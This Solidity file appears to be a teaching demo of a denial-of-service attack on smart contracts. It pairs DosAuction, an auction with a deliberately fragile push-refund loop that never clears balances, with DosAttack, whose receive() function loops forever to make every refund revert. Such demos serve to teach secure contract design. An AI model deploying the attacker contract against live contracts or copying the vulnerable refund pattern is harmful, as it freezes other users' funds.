// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DosAuction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }
    // push
    function refund() external {
        for(uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success,) = bidder.call{value: bidders[bidder]}("");
            require(success, "failed!");

            refundProgress++;
        }
    }
}

contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "failed");

        hack = !hack;
    }

    receive() external payable {
        if(hack == true) {
            while(true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}